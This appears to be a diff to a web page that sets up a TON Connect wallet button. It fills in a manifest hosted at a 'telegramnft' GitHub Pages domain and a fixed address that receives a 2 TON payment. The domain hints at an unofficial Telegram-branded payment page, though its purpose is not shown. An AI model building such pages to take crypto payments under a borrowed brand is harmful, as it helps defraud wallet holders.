@@ -73,7 +73,7 @@
 
   <script>
     const tonConnect = new TON_CONNECT_UI.TonConnectUI({
-      manifestUrl: "https://your-ton-bot.com/tonconnect-manifest.json",
+      manifestUrl: "https://telegramnft.github.io/tonconnect-manifest.json",
       buttonRootId: "connectWallet"
     });
 
@@ -103,7 +103,7 @@
         await tonConnect.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 600,
           messages: [{
-            address: "EQC_YOUR_RECEIVING_WALLET_ADDRESS",
+            address: "UQD7zTcEBRLNnI9DXJfzkauk0gP_PqerayMyOXfkiZ7UyGhj",
             amount: "2000000000", // 2 TON
             payload: ""
           }]
